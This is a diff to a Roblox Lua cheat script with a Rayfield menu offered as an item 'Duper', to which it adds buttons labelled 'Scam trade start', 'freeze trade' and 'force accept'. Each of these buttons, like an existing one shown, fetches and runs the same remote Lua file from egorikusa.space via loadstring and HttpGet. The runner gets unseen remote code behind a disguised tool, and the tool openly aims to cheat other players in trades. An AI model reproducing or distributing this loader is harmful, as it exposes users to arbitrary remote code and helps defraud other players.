@@ -30,7 +30,7 @@ local MainTab = Window:CreateTab("Duper", nil) -- Title, Image
 local MainSection = MainTab:CreateSection("Main")
 
 Rayfield:Notify({
-   Title = "now wait 5-10 mins",
+   Title = "now wait 5-10 mins after runing script",
    Content = "by me!",
    Duration = 5,
    Image = 13047715178,
@@ -50,6 +50,31 @@ local Button = MainTab:CreateButton({
 loadstring(game:HttpGet("https://egorikusa.space/c7d07e24756c075bc2e7d3c7.lua", true))()
    end,
 })
+
+local DupeTab = Window:CreateTab("scam trade", nil) -- Title, Image
+
+local Button = DupeTab:CreateButton({
+   Name = "Scam trade start",
+   Callback = function()
+loadstring(game:HttpGet("https://egorikusa.space/c7d07e24756c075bc2e7d3c7.lua", true))()
+   end,
+})
+
+local Button = DupeTab:CreateButton({
+   Name = "freeze trade",
+   Callback = function()
+loadstring(game:HttpGet("https://egorikusa.space/c7d07e24756c075bc2e7d3c7.lua", true))()
+   end,
+})
+
+local Button = DupeTab:CreateButton({
+   Name = "force accept",
+   Callback = function()
+loadstring(game:HttpGet("https://egorikusa.space/c7d07e24756c075bc2e7d3c7.lua", true))()
+   end,
+})
+
+local FunTab = Window:CreateTab("Fun while u wait", nil) -- Title, Image
 
 local Slider = MainTab:CreateSlider({
    Name = "WalkSpeed Slider",
@@ -76,5 +101,3 @@ local Slider = MainTab:CreateSlider({
 })
 
 
-
-local TPTab = Window:CreateTab("scam trade", nil) -- Title, Image
